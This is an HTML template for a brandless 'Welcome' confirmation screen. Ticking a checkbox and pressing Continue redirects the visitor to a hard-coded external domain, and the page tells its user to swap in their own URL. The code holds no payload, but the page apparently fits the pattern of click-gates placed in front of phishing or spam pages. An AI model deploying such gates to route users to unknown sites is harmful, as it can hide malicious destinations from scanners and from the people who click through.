<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome Back</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        /* Welcome Screen */
        #welcome-screen {
            max-width: 420px;
            width: 90%;
            background: white;
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
            text-align: center;
        }
        
        /* Welcome Header */
        .welcome-icon {
            width: 80px;
            height: 80px;
            background: #e8f0fe;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 24px;
            font-size: 40px;
        }
        
        h1 {
            color: #1a1a1a;
            font-size: 28px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .subtitle {
            color: #666;
            font-size: 16px;
            margin-bottom: 32px;
            line-height: 1.5;
        }
        
        /* Terms box */
        .terms-box {
            background: #f8f9fa;
            border: 1px solid #eaeef2;
            border-radius: 16px;
            padding: 20px;
            margin: 25px 0;
            text-align: left;
        }
        
        .checkbox-wrapper {
            display: flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            padding: 8px 0;
        }
        
        .custom-checkbox {
            width: 22px;
            height: 22px;
            border: 2px solid #d0d5dd;
            border-radius: 6px;
            background: white;
            display: inline-block;
            position: relative;
            transition: all 0.2s;
            flex-shrink: 0;
        }
        
        .checkbox-wrapper.checked .custom-checkbox {
            background: #2c3e50;
            border-color: #2c3e50;
        }
        
        .checkbox-wrapper.checked .custom-checkbox::after {
            content: '?';
            color: white;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 14px;
            font-weight: bold;
        }
        
        .checkbox-text {
            color: #2c3e50;
            font-size: 15px;
            line-height: 1.4;
        }
        
        .checkbox-text strong {
            color: #1a1a1a;
            font-weight: 600;
        }
        
        /* Continue Button */
        .continue-btn {
            background: #2c3e50;
            color: white;
            border: none;
            padding: 16px 24px;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
            margin: 20px 0 10px;
            letter-spacing: 0.3px;
        }
        
        .continue-btn:hover:not(:disabled) {
            background: #1a2b3a;
        }
        
        .continue-btn:disabled {
            background: #eef2f6;
            color: #9aa6b5;
            cursor: not-allowed;
        }
        
        /* Footer Links */
        .footer-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 25px;
            font-size: 13px;
            color: #8a9aa8;
        }
        
        .footer-links a {
            color: #5a6b7a;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        /* Message styles */
        .info-message {
            color: #2e7d32;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            background: #e8f5e9;
            padding: 12px;
            border-radius: 40px;
            font-weight: 500;
        }
        
        .error-message {
            color: #d32f2f;
            margin-top: 15px;
            font-size: 14px;
            display: none;
            background: #ffebee;
            padding: 12px;
            border-radius: 40px;
        }

        /* Loading spinner */
        .loading-spinner {
            display: none;
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #2c3e50;
            border-radius: 50%;
            margin: 20px auto;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <!-- YOUR EXISTING SCRIPTS -->
    <script>
        // Your existing scripts run normally
        console.log("Page loaded");
    </script>

    <!-- WELCOME SCREEN -->
    <div id="welcome-screen">
        <div class="welcome-icon">??</div>
        
        <h1>Welcome</h1>
        <p class="subtitle">Please confirm to continue</p>
        
        <!-- Terms confirmation -->
        <div class="terms-box">
            <div class="checkbox-wrapper" id="termsCheckbox" onclick="toggleTerms()">
                <span class="custom-checkbox" id="checkbox"></span>
                <span class="checkbox-text">
                    <strong>I confirm</strong> that I want to access this content
                </span>
            </div>
        </div>
        
        <button class="continue-btn" id="continueBtn" onclick="continueToSite()" disabled>Continue</button>
        
        <div class="info-message" id="successMessage">? Confirmed! Redirecting you now...</div>
        <div class="error-message" id="errorMessage">?? Please confirm to continue</div>
        <div class="loading-spinner" id="loadingSpinner"></div>
        
        <!-- Footer links -->
        <div class="footer-links">
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
            <a href="#">Help</a>
        </div>
    </div>

    <script>
        // Simple confirmation system
        let isConfirmed = false;
        
        // =========================================
        // SET YOUR DESTINATION URL HERE
        // =========================================
        const DESTINATION_URL = "https://karins.gatorpvaing.com/"; // <-- CHANGE THIS TO YOUR URL
        
        function toggleTerms() {
            const checkbox = document.getElementById('termsCheckbox');
            const continueBtn = document.getElementById('continueBtn');
            const errorMessage = document.getElementById('errorMessage');
            const successMessage = document.getElementById('successMessage');
            
            isConfirmed = !isConfirmed;
            
            if (isConfirmed) {
                checkbox.classList.add('checked');
                continueBtn.disabled = false;
                errorMessage.style.display = 'none';
                successMessage.style.display = 'block';
            } else {
                checkbox.classList.remove('checked');
                continueBtn.disabled = true;
                successMessage.style.display = 'none';
            }
        }
        
        function continueToSite() {
            if (isConfirmed) {
                // Show loading state
                document.getElementById('successMessage').style.display = 'none';
                document.getElementById('loadingSpinner').style.display = 'block';
                document.getElementById('continueBtn').disabled = true;
                
                // Optional: Show redirect message
                console.log("Redirecting to:", DESTINATION_URL);
                
                // Redirect after a brief moment
                setTimeout(function() {
                    window.location.href = DESTINATION_URL;
                }, 800);
                
            } else {
                document.getElementById('errorMessage').style.display = 'block';
            }
        }

        // Enter key support
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !document.getElementById('continueBtn').disabled) {
                continueToSite();
            }
        });

        // Initialize
        window.addEventListener('load', function() {
            console.log('Welcome screen ready');
        });
    </script>
</body>
</html>
